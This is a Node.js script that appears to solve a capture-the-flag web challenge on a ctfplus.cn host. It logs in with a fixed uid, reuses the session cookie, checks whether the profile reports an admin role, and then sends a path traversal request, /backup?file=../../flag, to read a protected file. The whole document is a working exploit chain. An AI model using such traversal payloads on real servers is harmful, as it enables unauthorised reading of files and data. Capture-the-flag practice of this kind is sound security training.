
const http = require('http');
const querystring = require('querystring');

const uid = "524a8f8e4e344efebf0868c589c30b9b";
const loginData = querystring.stringify({uid: uid});

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

const req = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  const profileData = JSON.stringify({uid: uid});
  const profileOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(profileData),
      'Cookie': cookie
    }
  };
  const profileReq = http.request(profileOpts, (profileRes) => {
    let body = '';
    profileRes.on('data', chunk => body += chunk);
    profileRes.on('end', () => {
      console.log("Profile response:");
      console.log(body);
      const json = JSON.parse(body);
      console.log("\nCurrent role:", json.role);
      if (json.role === "admin") {
        console.log("\n✅ Got admin role! Let's try /backup instead of /api/backup:");
        const backupOpts = {
          hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
          port: 80,
          path: '/backup?file=../../flag',
          method: 'GET',
          headers: {
            'Cookie': cookie
          }
        };
        const backupReq = http.request(backupOpts, (backupRes) => {
          let backupBody = '';
          backupRes.on('data', chunk => backupBody += chunk);
          backupRes.on('end', () => {
            console.log("\n🏁 Result from /backup:");
            console.log(backupBody);
          });
        });
        backupReq.end();
      }
    });
  });
  profileReq.write(profileData);
  profileReq.end();
});

req.on('error', err => console.error(err));
req.write(loginData);
req.end();
